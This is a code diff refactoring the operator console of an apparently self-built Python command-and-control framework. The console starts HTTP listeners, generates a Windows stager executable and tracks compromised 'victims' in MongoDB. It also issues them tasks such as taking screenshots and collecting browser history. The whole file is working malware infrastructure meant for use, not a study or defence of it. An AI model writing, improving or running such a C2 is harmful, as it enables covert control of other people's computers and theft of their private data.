@@ -1,14 +1,28 @@
-import subprocess
-import  os,signal
-import shutil
+from lib.listener import Listener
+from lib.database import Database
+from lib.task import Task
+from lib.victim import Victim
 import pdb
-import argparse
-from flask import Flask,request
 import pymongo
 import re
-import datetime
-import random
-import string
+import os
+import shutil
+import subprocess
+import argparse
+
+def parser():
+	parser = argparse.ArgumentParser(description='Python based C2')
+	
+	parser.add_argument('-g', '--generate', help = 'Generates exe', action='store_true')
+	args = parser.parse_args()
+	return args
+
+
+def display_main_help_menu():
+	commands = {'http':'Starts a new http listener.' , 'jobs': 'List existing http listener running.', 'kill': 'Kill the http listener running', 'generate': 'generates the stager in exe format in ./tmp folder', 'victims': 'Show the currently connected victims', 'use <VICTIM ID>' : 'Interact with connected victims','exit': 'exit the program.'}
+
+	for command in commands.keys():
+		print(command + " ---> " + commands[command])
 
 def generate_stager():
 	## Convert to exe and save
@@ -22,184 +36,10 @@ def generate_stager():
 	subprocess.call('sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows', cwd=r"./tmp",shell=True)
 
 
-
-## Initializes the various collections in the db with a sample record.
-def init_db(myclient):
-
-	dblist = myclient.list_database_names()
-	if "pythonc2" not in dblist:
-		print("Creating database")
-		mydb = myclient["pythonc2"]
-
-	mydb = myclient["pythonc2"]
-	collections = mydb.list_collection_names()
-
-	if 'commands' not in collections:
-		mycol = mydb["commands"]
-		h = {'sample':'To initialize db'}
-		mycol.insert_one(h)
-
-	if 'victims' not in collections:
-		mycol = mydb["victims"]
-		h = {'sample':'To initialize db'}
-		mycol.insert_one(h)
-
-
-## Drops the collections whenever the server quits
-def exit_db(myclient):  
-	mydb = myclient["pythonc2"]
-	cmds = mydb["commands"]
-	cmds.drop()
-	victims = mydb["victims"]
-	victims.drop()
-
-
-## Inserts a command issued to a victim in the db
-def insert_cmd_db(myclient,cmd,victim_id):
-	mydb = myclient["pythonc2"]
-	mycol = mydb["commands"]
-	task_id = ''.join(random.choices(string.ascii_lowercase +string.digits, k = 7))
-	h = {'victim_id': victim_id, 'task_id': task_id,'command':cmd, 'output':"",'issued': False}
-	mycol.insert_one(h)
-
-
-
-## Shows the various victim present in the db/connected with the server. maybe dead or alive.
-def show_victims(myclient):
-	mydb = myclient['pythonc2']
-	mycol = mydb["victims"]
-	for victim in mycol.find():
-		if 'id' in victim:
-			print(victim['id'])
-
-
-## Gets the last seen of the victim. If lastseen > 60secs, vicitim considered dead.
-def get_victim_status(lastseen):
-	time = datetime.datetime.now() - lastseen
-	if time.total_seconds() > 60:
-		print("Victim Dead. Seen "+str(time.total_seconds())+" secs ago.")
-	else:
-		print("Victim alive. Seen "+str(time.total_seconds())+" secs ago.")
-
-
-## Gets the various info of the victim. Trigerred by the info command.
-def get_victim_info(myclient,victim_id):
-	mydb = myclient['pythonc2']
-	victims = mydb["victims"]
-	victim = victims.find_one({'id':victim_id})
-	if victim:
-		return victim
-	else:
-		return False
-
-## Displays info like id, lastseen, OS etc..
-def show_victim_info(victim):
-	for key in victim.keys():
-		if key != '_id':
-			print(key + ' ---> '+ str(victim[key]))
-
-	get_victim_status(victim['lastseen'])
-
-## Checks if a victim id is present in the DB.
-def victim_present(myclient,victim_id):
-	mydb = myclient['pythonc2']
-	mycol = mydb["victims"]
-	for victim in mycol.find():
-		if 'id' in victim and victim['id'] == victim_id:
-			return True
-	return False
-
-## Checks if the command issued is supported or not by the victim
-def is_command_supported(myclient,victim_id,cmd):
-	modules = {'Windows' : ['screenshot','browser_history'], 'Linux': ['screenshot']}
-	victim = get_victim_info(myclient,victim_id)
-	if victim:
-		platform = victim['platform']
-		if cmd in modules[platform]:
-			return True
-	else:
-		print("Something is wrong, Victim not found.")
-
-	return False
-
-## Show the supported modules
-def show_supported_modules(myclient,victim_id):
-	modules = {'Windows' : ['screenshot','browser_history'], 'Linux': ['screenshot']}
-	victim = get_victim_info(myclient,victim_id)
-	if victim:
-		platform = victim['platform']
-		print(modules[platform])
-	else:
-		print("Something is wrong, Victim not found.")
-
-## Displays info about task issued to a victim
-def show_task_info(myclient,victim_id):
-	mydb = myclient["pythonc2"]
-	cmds = mydb["commands"]
-	x = cmds.find({'victim_id': victim_id})
-
-	for cmd in x:
-		print(cmd)
-
-## Shows victim help menu
-def display_victim_help_menu():
-	commands = {'info':'Shows current victim information.' , 'modules': 'Shows modules executable on current victim.', 'tasks':'Show the task issued to the current victim and if there is output','back': 'Go back to main menu.'}
-
-	for command in commands.keys():
-		print(command + " ---> " + commands[command])
-
-## Displays the victim menu
-def victim_menu(myclient,victim_id):
-	print("Interacting with victim - "+ victim_id)
-	while True:
-		print("Enter Victim based commands..")
-		cmd = str(input())
-
-		if cmd == 'info':
-			res = get_victim_info(myclient,victim_id)
-			if res:
-				show_victim_info(res)
-			else:
-				print("No info to show...Something is wrong..")
-		elif cmd == 'getfiles' or cmd == 'screenshot' or cmd == 'browser_history':
-			if is_command_supported(myclient,victim_id,cmd):
-				insert_cmd_db(myclient,cmd,victim_id)
-			else:
-				print('Command not supported. See the supported ones by running modules command')
-		elif cmd == 'modules':
-			show_supported_modules(myclient,victim_id)
-		elif cmd == 'tasks':
-			show_task_info(myclient,victim_id)
-		elif cmd == 'back':
-			print("Going back to main menu...")
-			return
-		elif cmd == 'help':
-			display_victim_help_menu()
-		else:
-			print("Not supported")
-
-
-def parser():
-	parser = argparse.ArgumentParser(description='Python based C2')
-	
-	parser.add_argument('-g', '--generate', help = 'Generates exe', action='store_true')
-	args = parser.parse_args()
-	return args
-
-
-
-def kill_listeners(flask_process):
-	os.killpg(os.getpgid(flask_process.pid), signal.SIGTERM)
-
-def display_main_help_menu():
-	commands = {'http':'Starts a new http listener.' , 'jobs': 'List existing http listener running.', 'kill': 'Kill the http listener running', 'generate': 'generates the stager in exe format in ./tmp folder', 'victims': 'Show the currently connected victims', 'use <VICTIM ID>' : 'Interact with connected victims','exit': 'exit the program.'}
-
-	for command in commands.keys():
-		print(command + " ---> " + commands[command])
-
-def main(myclient):
+def main(db_object):
 	args = parser()
-	init_db(myclient)
+	myclient = db_object.mongoclient
+
 	if args.generate:
 		## Import stager code and convert to exe
 		generate_stager()
@@ -207,58 +47,68 @@ def main(myclient):
 	while True:
 		print("Enter command:")
 		cmd = str(input())
+
 		if cmd == 'http':
-			## Run a http listsener
-			## see the process id 'ps -ef |grep nohup'
-			## https://stackoverflow.com/questions/4789837/how-to-terminate-a-python-subprocess-launched-with-shell-true
-			flask_process = subprocess.Popen('sudo nohup python3 server.py > log.txt 2>&1 &',stdout=subprocess.PIPE, 
-					shell=True, preexec_fn=os.setsid)
+			h = Listener(port="8080")
+			
+			h.start_listener()
 			print("Started http listener.")
 
-			# grep = subprocess.check_output('ps -ef | grep "nohup python3 server.py"',shell=True)
-			# grep = grep = grep.decode("utf-8")
-			# flask_pid = grep.split('\n')[0].split()[1]
-		if cmd == 'jobs':
-			if 'flask_process' in locals():
-				print("HTTP listener running ")
-			else:
-				print("No listener running")
-		if cmd == 'kill':
-			if 'flask_process' in locals():
-				kill_listeners(flask_process)
-				print("killed http listener")
-			else:
-				print("No listener running")
-		if cmd == 'generate':
+		elif cmd == 'listeners':
+			Listener.show_listeners()
+
+		elif cmd == 'kill_listeners':
+			Listener.kill_all_listeners()
+
+
+		elif cmd == 'generate':
 			generate_stager()
 			print("exe dumped to ./tmp")
 
-		if cmd == 'victims':
-			show_victims(myclient)
+		elif cmd == 'victims':
+			## Load victims from db everytime and instatiate objects. TODO - any effcient approach?
+			Victim.load_victims_from_db()
+			Victim.show_victims()
+
 		## Matching use LKF0599NMU
-		if re.match(r'use\s[\w]{10}',cmd):
-			## Implement the use victim logic
-			vicitim_id = re.findall(r'[\w]{10}',cmd)[0]
-			if victim_present(myclient,vicitim_id):
-				victim_menu(myclient,vicitim_id)
+		if re.match(r'^use [\w\d]{1,10}$',cmd):
+
+			Victim.load_victims_from_db()
+			victim_id = re.findall(r'^use ([\w\d]{1,10})$',cmd)[0]
+
+			## Supporting Regex to quickly interact with part of ID.
+			r = re.compile(victim_id+".*")
+			matched = list(filter(r.match, Victim.victims.keys()))
+
+			if len(matched) == 0 :
+				print("No victims found with that ID")
+			elif len(matched) == 1 :
+				victim_id = matched[0]
+				print(f"Interacting with {victim_id}")
+				Victim.victims[victim_id].victim_menu()
 			else:
-				print("Victim not present")
-		if cmd == 'help':
+				print("Multiple victims found, Please provide full or unique ID.")
+
+
+		elif cmd == 'help':
 			display_main_help_menu()
-		if cmd == 'exit':
-			if 'flask_process' in locals():
-				kill_listeners(flask_process)
-			exit_db(myclient)
+
+		elif cmd == 'exit':
+			Listener.kill_all_listeners()
+			db_object.drop_db()
 			break
 
-
-
-
-
 if __name__=="__main__":
-	myclient = pymongo.MongoClient("mongodb://localhost:27017/")
+
+	db_object = Database(url="mongodb://localhost:27017/")
+	Listener.mongoclient = db_object.mongoclient
+	Victim.mongoclient = db_object.mongoclient
+	Task.mongoclient = db_object.mongoclient
+
+	
+
 	try:
-		main(myclient)
+		main(db_object)
 	except KeyboardInterrupt:
-		kill_listeners(flask_process)
-		exit_db()
+		Listener.kill_all_listeners()
+		db_object.drop_db()
